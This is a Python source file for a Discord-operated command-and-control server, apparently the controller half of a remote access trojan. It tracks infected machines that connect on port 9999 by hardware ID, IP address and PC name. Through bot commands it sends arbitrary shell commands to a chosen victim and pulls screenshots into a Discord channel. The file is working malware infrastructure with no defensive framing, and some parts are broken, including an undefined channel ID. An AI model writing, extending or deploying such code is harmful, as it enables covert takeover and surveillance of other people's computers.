import discord
from discord.ext import commands
import asyncio
import json
import subprocess
import os

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

sessions = {}

async def handle_client(reader, writer):
    try:
        data = await reader.read(1024)
        client_info = json.loads(data.decode())
        hwid = client_info['hwid']
        pc_name = client_info['pc_name']
        sessions[hwid] = {
            'ip': writer.get_extra_info('peername')[0],
            'pc_name': pc_name,
            'reader': reader,
            'writer': writer
        }
        print(f"New connection: {hwid} from {writer.get_extra_info('peername')[0]}, PC Name: {pc_name}")

        while True:
            data = await reader.read(1024)
            if not data:
                break
            command = data.decode()
            print(f"Received command from {hwid}: {command}")
            if command == "take_screenshot":
                size_data = await reader.read(8)
                size = int.from_bytes(size_data, byteorder='big')
                screenshot_data = await reader.read(size)
                screenshot_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\screenshot_{hwid}.png"
                with open(screenshot_path, 'wb') as f:
                    f.write(screenshot_data)
                await bot.get_channel(CHANNEL_ID).send(file=discord.File(screenshot_path))
                os.remove(screenshot_path)
            else:
                # Process other commands normally
                pass
    except Exception as e:
        print(f"Connection error with {hwid}: {e}")
    finally:
        if hwid in sessions:
            del sessions[hwid]
        writer.close()
        await writer.wait_closed()

async def start_server():
    server = await asyncio.start_server(handle_client, '0.0.0.0', 9999)
    print("Server started on port 9999")
    async with server:
        await server.serve_forever()

@bot.event
async def on_ready():
    print(f'Bot is ready. Logged in as {bot.user}')
    asyncio.create_task(start_server())

@bot.command()
async def users(ctx):
    if not sessions:
        await ctx.send("No active users.")
    else:
        response = "Users:\n"
        for hwid, session in sessions.items():
            response += f"HWID: {hwid}, IP: {session['ip']}, PC Name: {session['pc_name']}\n"
        await ctx.send(response)

@bot.command()
async def shell(ctx, hwid: str, *, command: str):
    if hwid not in sessions:
        await ctx.send(f"No HWID found: {hwid}")
        return
    
    session = sessions[hwid]
    writer = session['writer']
    reader = session['reader']
    try:
        writer.write(command.encode())
        await writer.drain()
        result = await reader.read(4096)
        await ctx.send(f"Output:\n{result.decode()}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def ss(ctx, hwid: str):
    if hwid not in sessions:
        await ctx.send(f"No HWID found: {hwid}")
        return
    
    session = sessions[hwid]
    writer = session['writer']
    try:
        writer.write("take_screenshot".encode())
        await writer.drain()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

bot.run('BOT_TOKEN')
